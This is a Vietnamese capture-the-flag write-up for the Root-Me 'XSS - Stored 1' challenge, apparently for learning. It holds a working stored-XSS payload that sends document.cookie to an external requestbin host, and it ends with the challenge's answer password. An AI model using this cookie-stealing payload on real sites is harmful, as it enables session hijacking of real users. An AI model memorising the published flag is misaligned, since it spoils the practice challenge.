# WRITE UP

## **Challenge: [XSS -- Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)**

Challenge yêu cầu ta thực hiện đánh cắp cookie phiên quản trị viên và cung cấp cho ta một website để đăng post:

![Graphical user interface, text, application, email Description automatically generated](./media/image1.png){width="4.271972878390201in" height="3.1117574365704286in"}

Kiểm tra source thì thấy đây là một form với phương thức "POST". Như tên đề bài, ta sẽ thực hiện XSS Stored vào input. Nhưng trước hết ta kiểm tra xem nó bị XSS ở đâu, ta được kết quả là nó bị tại ô input 'Message':

![Graphical user interface, text, application, email Description automatically generated](./media/image2.png){width="4.170361986001749in" height="2.3788156167979in"}

![Text Description automatically generated](./media/image3.png){width="6.5in" height="1.0951388888888889in"}

Đầu tiên, ta thực hiện tạo một nơi để có thể thu thập các HTTP Request với <https://requestbin.in>:

![Graphical user interface, application Description automatically generated](./media/image4.png){width="6.5in" height="2.2159722222222222in"}

Như vậy, ta có một requestbin tại <https://eojx5xx99skfihj.m.pipedream.net>:

Tiếp theo, ta có thể đoán được chắc chắn Forum v0.001 website này bị XSS, do vậy, ta thực hiện viết payload để attack vào input của form này:

Payload: \<script\>document.write(\"\<img src=\'https://eojx5xx99skfihj.m.pipedream.net/\"+document.cookie+\"\'\>\</img\>\");\</script\>

![](./media/image5.png){width="5.567148950131234in" height="2.6252274715660544in"}

![Graphical user interface, text, application Description automatically generated](./media/image6.png){width="6.033856080489938in" height="1.2501082677165354in"}

Kiểm tra request bin, ta nhận được giá trị ADMIN_COOKIE.

![A picture containing graphical user interface Description automatically generated](./media/image7.png){width="6.5in" height="1.2125in"}

**Password:** NkI9qe4cdLIO2P7MIsWS8ofD6
